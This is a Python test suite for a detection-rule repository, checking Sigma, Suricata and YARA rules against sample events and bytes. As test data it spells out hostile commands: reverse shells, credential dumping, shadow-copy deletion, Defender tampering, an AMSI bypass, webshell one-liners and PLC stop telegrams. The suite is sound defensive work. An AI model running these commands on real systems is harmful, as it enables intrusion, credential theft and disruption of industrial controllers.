# TechDetechtives detection rule tests. Copyright (c) 2026 TechDetechtives. MIT licence.
"""Run with:  python3 -m unittest discover -s platform/tests -v

Three things are checked without needing the platform:

* Sigma rules: each rule's logic is evaluated here against sample events (the
  command lines its paired test produces, and look-alikes that must not match).
* Suricata rules: structure only (this is not the engine's own syntax check).
* YARA rules: compiled and run against generated sample files, when a `yara`
  program is installed; skipped otherwise.

Needs PyYAML, which the other repository checks already use.
"""

import re
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

import yaml

DETECTIONS = Path(__file__).resolve().parents[1] / "detections"
SIGMA = {path.name: yaml.safe_load(path.read_text()) for path in sorted((DETECTIONS / "sigma").glob("*.yml"))}


# --- a small evaluator for the Sigma features these rules use -------------------
def _match_value(actual, wanted, modifiers):
    if actual is None:
        return False
    actual, wanted = str(actual).lower(), str(wanted).lower()
    if "contains" in modifiers:
        return wanted in actual
    if "endswith" in modifiers:
        return actual.endswith(wanted)
    if "startswith" in modifiers:
        return actual.startswith(wanted)
    return actual == wanted


def _match_selection(selection, event):
    for key, wanted in selection.items():
        field, *modifiers = key.split("|")
        unknown = set(modifiers) - {"contains", "endswith", "startswith", "all"}
        if unknown:
            raise AssertionError(f"modifier not handled by this test: {unknown}")
        values = wanted if isinstance(wanted, list) else [wanted]
        hits = [_match_value(event.get(field), value, modifiers) for value in values]
        if not (all(hits) if "all" in modifiers else any(hits)):
            return False
    return True


def sigma_matches(rule, event):
    detection = dict(rule["detection"])
    condition = detection.pop("condition")
    results = {name: _match_selection(body, event) for name, body in detection.items()}

    def of(match):
        quantifier, pattern = match.group(1), match.group(2)
        names = [name for name in results if re.fullmatch(pattern.replace("*", ".*"), name)]
        if not names:
            raise AssertionError(f"'{pattern}' matches no selection")
        return str(all(results[name] for name in names) if quantifier == "all" else any(results[name] for name in names))

    expression = re.sub(r"\b(1|all) of ([A-Za-z0-9_*]+)", of, condition)
    expression = re.sub(r"\b[A-Za-z_][A-Za-z0-9_]*\b",
                        lambda m: m.group(0) if m.group(0) in ("and", "or", "not", "True", "False") else str(results[m.group(0)]),
                        expression)
    return eval(expression, {"__builtins__": {}})  # only True/False/and/or/not/() remain


def win(command_line, image=None, parent=None, original=None):
    image = image or "C:\\Windows\\System32\\" + command_line.split()[0].strip('"').split("\\")[-1]
    if not image.lower().endswith(".exe"):
        image += ".exe"
    return {"CommandLine": command_line, "Image": image, "ParentImage": parent or "C:\\Windows\\System32\\cmd.exe",
            "OriginalFileName": original}


def linux(command_line, image="/usr/bin/bash"):
    return {"CommandLine": command_line, "Image": image}


# rule file: (events that must match, events that must not)
SIGMA_CASES = {
    "techdetechtives_lsass_dump_comsvcs.yml": (
        [win("C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Users\\a\\AppData\\Local\\Temp\\lsass-comsvcs.dmp full"),
         win("rundll32 comsvcs.dll,#24 624 x.dmp full")],
        [win("rundll32.exe shell32.dll,Control_RunDLL"), win("regsvr32 /s comsvcs.dll")]),
    "techdetechtives_registry_hive_save_credentials.yml": (
        [win("reg save HKLM\\sam C:\\Users\\a\\AppData\\Local\\Temp\\sam"), win("reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE"),
         win('reg save "HKLM\\SECURITY" out.hiv')],
        [win("reg export HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip tcpip.reg"), win("reg query HKLM\\SAM "),
         win("reg save HKCU\\Software\\Vendor backup.hiv")]),
    "techdetechtives_ntds_extraction.yml": (
        [win('ntdsutil "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\ntds_T1003" q q'),
         win("cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit")],
        [win("ntdsutil snapshot \"list all\" quit quit"), win("cmd.exe /c dir C:\\Windows\\NTDS\\ntds.dit")]),
    "techdetechtives_recovery_inhibited.yml": (
        [win("vssadmin.exe delete shadows /all /quiet"), win("wmic.exe shadowcopy delete"),
         win("wbadmin delete catalog -quiet"), win("bcdedit.exe /set {default} recoveryenabled no"),
         win("powershell.exe -Command Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}")],
        [win("vssadmin.exe list shadows"), win("vssadmin.exe create shadow /for=C:"), win("wbadmin get versions"),
         win("bcdedit.exe /enum")]),
    "techdetechtives_event_logs_cleared.yml": (
        [win("wevtutil cl System"), win("powershell.exe -Command Clear-EventLog -LogName Security")],
        [win("wevtutil el"), win("wevtutil qe System /c:5"), win("powershell.exe -Command Get-EventLog -List")]),
    "techdetechtives_defender_tampering.yml": (
        [win("powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring 1"),
         win('powershell.exe -Command Add-MpPreference -ExclusionPath "C:\\Temp"'), win("sc stop WinDefend"),
         win("sc config WinDefend start=disabled")],
        [win("powershell.exe -Command Get-MpPreference"), win("sc query WinDefend"), win("sc stop Spooler"),
         win("powershell.exe -Command Remove-MpPreference -ExclusionPath C:\\Temp")]),
    "techdetechtives_office_spawns_interpreter.yml": (
        [win("powershell.exe -nop -w hidden -c calc", parent="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
         win("cmd.exe /c C:\\Users\\a\\AppData\\Local\\Temp\\art1204.bat", parent="C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE")],
        [win("splwow64.exe 8192", parent="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
         win("powershell.exe -nop", parent="C:\\Windows\\explorer.exe")]),
    "techdetechtives_signed_binary_remote_script.yml": (
        [win("mshta.exe javascript:a=(GetObject('script:https://example.org/x.sct')).Exec();close();"),
         win("C:\\Windows\\system32\\regsvr32.exe /s /u /i:https://example.org/RegSvr32.sct scrobj.dll"),
         win('mshta.exe "about:<hta:application><script language="VBScript">Close(1)</script>"')],
        [win("mshta.exe C:\\Apps\\legacy\\menu.hta"), win("regsvr32.exe /s C:\\Windows\\System32\\vbscript.dll"),
         win('regsvr32.exe /s /u /i:"C:\\AtomicRedTeam\\atomics\\T1218.010\\src\\RegSvr32.sct" scrobj.dll')]),
    "techdetechtives_certutil_download_or_decode.yml": (
        [win("certutil -urlcache -split -f https://example.org/file.txt Atomic-license.txt"),
         win("certutil -decode C:\\Users\\a\\AppData\\Local\\Temp\\T1140_calc.txt C:\\Users\\a\\AppData\\Local\\Temp\\out.exe"),
         win("C:\\Users\\a\\AppData\\Local\\Temp\\tcm.tmp -decode in.txt out.exe", image="C:\\Users\\a\\AppData\\Local\\Temp\\tcm.tmp", original="CertUtil.exe")],
        [win("certutil -hashfile C:\\file.iso SHA256"), win("certutil -store My"),
         win("cmd.exe /c echo certutil -urlcache -f http://x/y z")]),
    "techdetechtives_scheduled_task_suspicious_action.yml": (
        [win('schtasks /create /TN "ProactiveScan" /TR "wscript.exe \\"%APPDATA%\\Microsoft\\Chkdsk.js\\" -scan x" /SC ONLOGON /F'),
         win('schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"')],
        [win("schtasks /query /fo LIST"), win('SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\notepad.exe /ST 20:10'),
         win("schtasks /delete /tn spawn /f")]),
    "techdetechtives_service_created_suspicious_binary.yml": (
        [win('sc.exe create TDTest binPath= "cmd.exe /c echo td" start= demand'),
         win('sc create upd binpath= "C:\\Users\\Public\\upd.exe" start= auto')],
        [win('sc.exe create AtomicTestService_CMD binPath= "C:\\AtomicRedTeam\\atomics\\T1543.003\\bin\\AtomicService.exe" start=auto type=Own'),
         win("sc.exe query type= service"), win("sc.exe start TDTest")]),
    "techdetechtives_linux_reverse_shell.yml": (
        [linux("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"), linux("nc -e /bin/sh 203.0.113.9 4444", image="/usr/bin/nc"),
         linux("sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.9 1234 >/tmp/f"),
         linux("socat tcp-connect:203.0.113.9:4444 exec:/bin/sh,pty,stderr", image="/usr/bin/socat")],
        [linux("rsync -e ssh -c /data backup:/data", image="/usr/bin/rsync"), linux("nc -zv 10.0.0.5 443", image="/usr/bin/nc"),
         linux("socat - tcp:10.0.0.5:80", image="/usr/bin/socat"), linux("bash -c ls /dev")]),
    "techdetechtives_wmi_spawns_script_interpreter.yml": (
        [win("cscript.exe", parent="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe")],
        [win("notepad.exe", parent="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"), win("cscript.exe")]),
    "techdetechtives_powershell_encoded_hidden.yml": (
        [win("powershell.exe -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA")],
        [win("powershell.exe -e JgAgACgAZwBjAG0A"), win("powershell.exe -WindowStyle Hidden -File C:\\scripts\\job.ps1")]),
    "techdetechtives_powershell_base64_decode_and_invoke.yml": (
        [{"ScriptBlockText": "iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))"}],
        [{"ScriptBlockText": "[Convert]::FromBase64String($cert) | Set-Content cert.cer"}, {"ScriptBlockText": "Invoke-Expression 'Get-Date'"}]),
    "techdetechtives_linux_download_piped_to_shell.yml": (
        [linux("sh -c cd /tmp; curl -s https://example.org/pipe-to-shell.sh |bash")],
        [linux("curl -s https://example.org/file -o /tmp/file"), linux("cat install.sh | bash")]),
    "techdetechtives_ot_bacnet_device_disabled_or_restarted.yml": (
        [{"event.dataset": "zeek.bacnet", "bacnet.pdu.service": "reinitialize_device"},
         {"event.dataset": "zeek.bacnet", "bacnet.pdu.service": "device_communication_control"}],
        [{"event.dataset": "zeek.bacnet", "bacnet.pdu.service": "read_property"},
         {"event.dataset": "zeek.modbus", "bacnet.pdu.service": "reinitialize_device"}]),
    "techdetechtives_ot_bacnet_objects_changed.yml": (
        [{"event.dataset": "zeek.bacnet", "bacnet.pdu.service": "atomic_write_file"}],
        [{"event.dataset": "zeek.bacnet", "bacnet.pdu.service": "write_property"}]),
    "techdetechtives_ot_s7_program_transfer.yml": (
        [{"event.dataset": "zeek.s7comm", "s7.function.name": "Request Download"},
         {"event.dataset": "zeek.s7comm", "s7.function.name": "Start Upload"}],
        [{"event.dataset": "zeek.s7comm", "s7.function.name": "Read Variable"},
         {"event.dataset": "zeek.s7comm", "s7.function.name": "Setup Communication"}]),
}


class SigmaRules(unittest.TestCase):
    def test_every_rule_has_cases(self):
        self.assertEqual(sorted(SIGMA_CASES), sorted(SIGMA))

    def test_rules_match_what_they_should_and_nothing_else(self):
        for name, (positives, negatives) in SIGMA_CASES.items():
            rule = SIGMA[name]
            for event in positives:
                self.assertTrue(sigma_matches(rule, event), f"{name} should match {event}")
            for event in negatives:
                self.assertFalse(sigma_matches(rule, event), f"{name} should not match {event}")

    def test_required_fields_and_level(self):
        for name, rule in SIGMA.items():
            for key in ("title", "id", "status", "description", "author", "date", "tags", "logsource", "detection", "falsepositives", "level"):
                self.assertIn(key, rule, f"{name}: missing {key}")
            self.assertTrue(rule["title"].startswith("TechDetechtives - "), name)
            self.assertIn(rule["level"], ("informational", "low", "medium", "high", "critical"), name)
            self.assertRegex(rule["id"], r"^[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}$", name)


class SuricataRules(unittest.TestCase):
    RULES = [(path.name, number, line) for path in sorted((DETECTIONS / "suricata").glob("*.rules"))
             for number, line in enumerate(path.read_text().splitlines(), 1) if line.strip() and not line.startswith("#")]
    HEADER = re.compile(r"^alert (tcp|udp|dns|http|modbus|dnp3) (\S+) (\S+) -> (\S+) (\S+) \((.*)\)$")
    CLASSTYPES = {"attempted-dos", "attempted-recon", "attempted-admin", "policy-violation", "misc-activity"}

    def test_structure(self):
        sids = []
        for name, number, line in self.RULES:
            where = f"{name}:{number}"
            match = self.HEADER.match(line)
            self.assertIsNotNone(match, f"{where}: not 'alert <proto> <src> <port> -> <dst> <port> (options)'")
            options = match.group(6)
            self.assertTrue(options.endswith(";"), f"{where}: options must end with ';'")
            self.assertEqual(options.count('"') % 2, 0, f"{where}: unbalanced quotes")
            outside_quotes = re.sub(r'"[^"]*"', '""', options)
            self.assertNotIn("(", outside_quotes, where)
            message = re.search(r'msg:"([^"]+)"', options)
            self.assertTrue(message and message.group(1).startswith("TECHDETECHTIVES "), f"{where}: msg must start with TECHDETECHTIVES")
            self.assertNotIn(";", message.group(1), where)
            sid = re.search(r"\bsid:(\d+);", options)
            self.assertIsNotNone(sid, f"{where}: no sid")
            self.assertTrue(1900001 <= int(sid.group(1)) <= 1900999, f"{where}: sid outside the reserved range")
            sids.append(int(sid.group(1)))
            self.assertRegex(options, r"\brev:\d+;", where)
            classtype = re.search(r"classtype:([a-z-]+);", options)
            self.assertTrue(classtype and classtype.group(1) in self.CLASSTYPES, f"{where}: classtype")
            self.assertRegex(options, r"priority:[123];", f"{where}: priority decides the severity and must be set")
            for content in re.findall(r'content:"([^"]*)"', options):
                for block in re.findall(r"\|([^|]*)\|", content):
                    self.assertRegex(block, r"^([0-9a-fA-F]{2}( |$))+$", f"{where}: bad hex bytes '{block}'")
        self.assertEqual(len(sids), len(set(sids)), "duplicate sid")

    def test_ot_rules_use_the_protocol_decoders_where_they_exist(self):
        for name, number, line in self.RULES:
            if line.startswith("alert modbus"):
                self.assertRegex(line, r"modbus: (unit \d+, )?(function \d+(, subfunction \d+)?|access (read|write))", f"{name}:{number}")
            if line.startswith("alert dnp3"):
                self.assertRegex(line, r"dnp3_(func|ind):[a-z_]+;", f"{name}:{number}")


def _payload_matches(options, payload):
    """Evaluate the byte-position options these rules use against one request:
    content with offset/depth, content after the previous match (distance:0),
    and a one-byte byte_test with a negated bit mask."""
    cursor, pending = 0, None
    steps = re.findall(r'(content):"([^"]*)"|(offset|depth|distance):(\d+)|(byte_test):([^;]+)', options)
    parsed = []
    for content, value, modifier, number, test, arguments in steps:
        if content:
            data = b"".join(bytes.fromhex(part) if index % 2 else part.encode() for index, part in enumerate(value.split("|")))
            parsed.append({"data": data})
        elif modifier:
            parsed[-1][modifier] = int(number)
        else:
            parsed.append({"test": [item.strip() for item in arguments.split(",")]})
    for step in parsed:
        if "test" in step:
            size, operator, value, offset = step["test"][:4]
            if (size, operator) != ("1", "!&"):
                raise AssertionError("byte_test form not handled by this test")
            if int(offset) >= len(payload) or payload[int(offset)] & int(value):
                return False
            continue
        data = step["data"]
        if "distance" in step:
            found = payload.find(data, cursor + step["distance"])
        else:
            start = step.get("offset", 0)
            window = payload[start:start + step["depth"]] if "depth" in step else payload[start:]
            found = window.find(data)
            found = found + start if found >= 0 else -1
        if found < 0:
            return False
        cursor = found + len(data)
    return True


class SuricataBytePositions(unittest.TestCase):
    """The S7 and IEC 104 rules match bytes at fixed positions. These requests
    are the well-known ones (the S7 telegrams are those the snap7 library sends)."""

    S7_STOP = bytes.fromhex("0300002102f080" "32010000" "0e00" "0010" "0000" "29" "0000000000" "09" "505f50524f4752414d")
    S7_START = bytes.fromhex("0300002502f080" "32010000" "0c00" "0014" "0000" "28" "000000000000fd" "0000" "09" "505f50524f4752414d")
    S7_DELETE = bytes.fromhex("0300002b02f080" "32010000" "0d00" "001a" "0000" "28" "000000000000fd" "000a" "01003042303030303142" "05" "5f44454c45")
    S7_READ = bytes.fromhex("0300001f02f080" "32010000" "0100" "000e" "0000" "04" "01120a10020001000084000000")
    S7_SETUP = bytes.fromhex("0300001902f080" "32010000" "0000" "0008" "0000" "f0" "0000010001" "01e0")
    IEC_RESET = bytes.fromhex("680e" "00000000" "69" "01" "0600" "0100" "000000" "01")
    IEC_INTERROGATION = bytes.fromhex("680e" "00000000" "64" "01" "0600" "0100" "000000" "14")
    IEC_SUPERVISORY = bytes.fromhex("6804" "01006900")       # S-format frame: not a command, whatever its bytes

    def options(self, sid):
        for _, _, line in SuricataRules.RULES:
            if f"sid:{sid};" in line:
                return line
        raise AssertionError(f"no rule with sid {sid}")

    def test_s7_rules(self):
        cases = {1900151: (self.S7_STOP, [self.S7_START, self.S7_READ, self.S7_SETUP, self.S7_DELETE]),
                 1900152: (self.S7_START, [self.S7_STOP, self.S7_READ, self.S7_DELETE]),
                 1900153: (self.S7_DELETE, [self.S7_START, self.S7_STOP, self.S7_READ])}
        for sid, (positive, negatives) in cases.items():
            self.assertTrue(_payload_matches(self.options(sid), positive), sid)
            for payload in negatives:
                self.assertFalse(_payload_matches(self.options(sid), payload), sid)

    def test_iec104_reset_process(self):
        options = self.options(1900161)
        self.assertTrue(_payload_matches(options, self.IEC_RESET))
        self.assertFalse(_payload_matches(options, self.IEC_INTERROGATION))
        self.assertFalse(_payload_matches(options, self.IEC_SUPERVISORY))

    def test_function_byte_position_agrees_with_the_request_layout(self):
        # TPKT (4 bytes) + COTP data header (3) + S7 job header (10) puts the function at byte 17.
        self.assertEqual(self.S7_STOP[17], 0x29)
        self.assertEqual(self.S7_START[17], 0x28)
        self.assertEqual(len(self.S7_STOP), int.from_bytes(self.S7_STOP[2:4], "big"))
        self.assertEqual(self.IEC_RESET[6], 0x69)


def _yara_program():
    return shutil.which("yara")


@unittest.skipUnless(_yara_program(), "the yara program is not installed")
class YaraRules(unittest.TestCase):
    """Sample files are made here at run time, so nothing that looks like attack
    tooling is stored in the repository."""

    LNK = bytes.fromhex("4c0000000114020000000000c000000000000046") + b"\x00" * 56

    SAMPLES = {
        "TechDetechtives_Credential_Tool_Mimikatz_Text": (
            [b"privilege::debug\nsekurlsa::logonpasswords\nexit\n", b"MZ" + b"\x00" * 64 + b"mimikatz 2.2.0 gentilkiwi lsadump::sam"],
            [b"notes about the mimikatz tool, by gentilkiwi", b"privilege::debug only"]),
        "TechDetechtives_PowerShell_Download_And_Run": (
            [b"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"],
            [b"(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.txt') | Out-File a.txt", b"Invoke-Expression 'Get-Date'"]),
        "TechDetechtives_PowerShell_Encoded_Launcher": (
            [b"@echo off\npowershell.exe -nop -enc " + b"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" * 3 + b"\n"],
            [b"powershell.exe -ExecutionPolicy Bypass -File setup.ps1", b"powershell -e short"]),
        "TechDetechtives_Script_Disables_AMSI": (
            [b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"],
            [b"MZ" + b"\x00" * 64 + b"System.Management.Automation.AmsiUtils amsiInitFailed", b"# detection note: AmsiScanBuffer is called by PowerShell"]),
        "TechDetechtives_Webshell_Request_Driven_Execution": (
            [b"<?php @eval($_POST['x']); ?>", b"<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"p\"],\"unsafe\");%>",
             b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", b"<?php system($_GET['c']); ?>"],
            [b"<?php echo htmlspecialchars($_POST['name']); ?>", b"<?php eval('return 1;'); ?>", b"String p = request.getParameter(\"page\");"]),
        "TechDetechtives_Shortcut_Starts_Script_Interpreter": (
            [LNK + "powershell.exe -w hidden -enc AAAA".encode("utf-16-le")],
            [LNK + "C:\\Program Files\\App\\app.exe".encode("utf-16-le"), b"powershell.exe -w hidden https://x"]),
        "TechDetechtives_Script_Runs_Command_Through_WScript_Shell": (
            [b"<html><HTA:APPLICATION ID=\"a\"/><script>new ActiveXObject(\"WScript.Shell\").Run(\"powershell -w hidden -c calc\")</script></html>"],
            [b"Set s = CreateObject(\"WScript.Shell\")\ns.Popup \"Backup finished\"", b"new ActiveXObject(\"WScript.Shell\").Run(\"notepad.exe\")"]),
        "TechDetechtives_Program_Exports_ReflectiveLoader": (
            [b"MZ" + b"\x00" * 128 + b"ReflectiveLoader\x00"],
            [b"docs: the ReflectiveLoader function", b"MZ" + b"\x00" * 128 + b"LoadLibraryA\x00"]),
        "TechDetechtives_OT_Triton_Framework_Files": (
            [b"PK\x03\x04 TsHi.pyc TsBase.pyc TsLow.pyc sh.pyc", b"MZ" + b"\x00" * 32 + b"inject.bin imain.bin TsLow"],
            [b"TsHi only", b"inject.bin and imain.bin with nothing else"]),
        "TechDetechtives_OT_Attack_Framework_SCADA_Modules": (
            [b"use auxiliary/scanner/scada/modbusdetect\nset RHOSTS 10.0.0.0/24\nrun\n"],
            [b"use auxiliary/scanner/portscan/tcp\n"]),
        "TechDetechtives_OT_Script_Stops_Or_Reprograms_Controller": (
            [b"import snap7\nc = snap7.client.Client()\nc.connect('10.0.0.5', 0, 1)\nc.plc_stop()\n"],
            [b"import snap7\nc = snap7.client.Client()\nprint(c.get_cpu_info())\n", b"from pymodbus.client import ModbusTcpClient\nc.write_coil(1, True)\n"]),
        "TechDetechtives_Script_Base64_Decode_And_Invoke": (
            [b"$b=[Convert]::FromBase64String($x); Invoke-Expression ([Text.Encoding]::UTF8.GetString($b))"],
            [b"[Convert]::FromBase64String($x) | Set-Content out.bin"]),
    }

    @classmethod
    def setUpClass(cls):
        cls.rule_files = sorted((DETECTIONS / "yara").glob("*.yar"))
        cls.defined = set()
        for path in cls.rule_files:
            cls.defined.update(re.findall(r"^rule (\w+)", path.read_text(), re.M))

    def scan(self, data):
        with tempfile.TemporaryDirectory() as folder:
            sample = Path(folder) / "sample.bin"
            sample.write_bytes(data)
            hits = set()
            for path in self.rule_files:
                result = subprocess.run([_yara_program(), str(path), str(sample)], capture_output=True, text=True, timeout=60)
                self.assertEqual(result.returncode, 0, f"{path.name} does not compile: {result.stderr}")
                hits.update(line.split()[0] for line in result.stdout.splitlines() if line.strip())
            return hits

    def test_every_rule_has_samples(self):
        self.assertEqual(sorted(self.SAMPLES), sorted(self.defined))

    def test_rules_match_their_samples_and_not_the_lookalikes(self):
        for rule, (positives, negatives) in self.SAMPLES.items():
            for data in positives:
                self.assertIn(rule, self.scan(data), f"{rule} should match {data[:60]!r}")
            for data in negatives:
                self.assertNotIn(rule, self.scan(data), f"{rule} should not match {data[:60]!r}")


class YaraRuleText(unittest.TestCase):
    def test_names_metadata_and_size_bound(self):
        for path in sorted((DETECTIONS / "yara").glob("*.yar")):
            text = path.read_text()
            for name, body in re.findall(r"^rule (\w+)\s*\{(.*?)^\}", text, re.M | re.S):
                self.assertTrue(name.startswith("TechDetechtives_"), name)
                for field in ("description", "author", "date", "severity"):
                    self.assertRegex(body, rf'{field} = "[^"]+"', f"{name}: meta {field}")
                self.assertIn("filesize <", body, f"{name}: bound the file size")


if __name__ == "__main__":
    unittest.main()
